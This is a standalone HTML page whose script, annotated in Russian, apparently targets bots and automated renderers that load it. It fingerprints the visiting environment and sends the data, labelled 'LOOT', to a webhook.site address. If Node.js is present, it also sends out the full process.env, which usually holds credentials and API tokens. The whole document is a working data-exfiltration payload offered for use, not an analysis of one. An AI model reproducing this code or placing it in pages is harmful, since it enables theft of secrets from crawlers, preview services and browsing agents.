<!DOCTYPE html>
<html>
<body>
    <script>
        (function() {
            const hook = "https://webhook.site/8cda2992-b523-4748-a5a4-616893cf1435";
            
            // Собираем системные отпечатки (Fingerprinting)
            const info = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                cores: navigator.hardwareConcurrency, // Кол-во ядер процессора сервера
                memory: navigator.deviceMemory, // Объем ОЗУ в ГБ
                lang: navigator.languages.join(','),
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                // Самое интересное: проверяем наличие автоматизации
                webdriver: navigator.webdriver, 
                plugins: navigator.plugins.length,
                url: window.location.href
            };
            // Превращаем в строку и кодируем в Base64, чтобы спецсимволы не ломали запрос
            const payload = btoa(JSON.stringify(info));
            // Отправляем максимально просто через GET (это боты любят больше всего)
            const img = new Image();
            img.src = `${hook}/LOOT_V2?data=${payload}`;
            
            // Попытка №2: Если это Node.js или специфический бот, попробуем вытащить process
            try {
                if (typeof process !== 'undefined') {
                    new Image().src = `${hook}/NODE_PROCESS?env=` + btoa(JSON.stringify(process.env));
                }
            } catch(e) {}
        })();
    </script>
</body>
</html>
